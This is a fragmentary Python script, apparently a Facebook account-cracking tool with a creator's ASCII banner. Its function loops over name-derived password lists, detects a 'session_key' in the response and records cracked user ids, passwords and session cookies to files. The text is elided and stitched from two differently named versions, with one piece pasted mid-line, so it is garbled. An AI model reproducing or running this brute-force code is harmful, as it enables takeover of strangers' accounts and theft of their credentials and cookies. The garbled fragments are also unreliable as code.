...
logo=("""\033[1;37m 
  ...
  __    __       __        ________  ________     __      _____  ___   
 /" |  | "\     /""\      /"       )/"       )   /""\    (\"   \|"  \  
(:  (__)  :)   /    \    (:   \___/(:   \___/   /    \   |.\\   \    | 
 \/      \/   /' /\  \    \___  \   \___  \    /' /\  \  |: \.   \\  | 
 //  __  \\  //  __'  \    __/  \\   __/  \\  //  __'  \ |.  \    \. | 
(:  (  )  :)/   /  \\  \  /" \   :) /" \   :)/   /  \\  \|    \    \ | 
 \__|  |__/(___/    \___)(_______/ (_______/(___/    \___)\___|\____\) 
                                                                       
\033[1;32m XD\033[1;37m 
----------------------------------------------
\033[1;32m•\033[1;37m CREATED BY  \033[1;32m •√\033[1;37m  ALI HASSAN
\033[1;32m•\033[1;37m FACEBOOK    \033[1;32m •√\033[1;37m  ALI HASSAN
\033[1;32m•\033[1;37m FRIENDS     \033[1;32m •√\033[1;37m  VEER ALI
...
def api1(ids,names,passlist):
	try:
		global ok,loop,sim_id
		sys.stdout.write('\r\r\33[1;37m[HASSAN-M1]  %s|  OK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
		fn = names.split(' ')[0]
		try:
			ln = names.split(' ')[1]
		except:
		...
		for pw in passlist:
			...
			if 'session_key' in po:
					uid = str(po['uid'])
					print('\r\r\033[1;32m [HASSAN-OK] '+uid+' | '+pas)
...
Main_REHAN()￼Enter						print('\r\r\033[1;32m[REHAN-OK] '+uid+' | '+pas)
						#print(' \33[1;96m[Cookies] == '+cookie)
						file_path_ok = os.path.join(folder_path, 'REHAN_RANDOM_OK.txt')
						file_path_cookies = os.path.join(folder_path, 'REHAN_COOKIES.txt')
						with open(file_path_ok, 'a') as file_ok, open(file_path_cookies, 'a') as file_cookies:
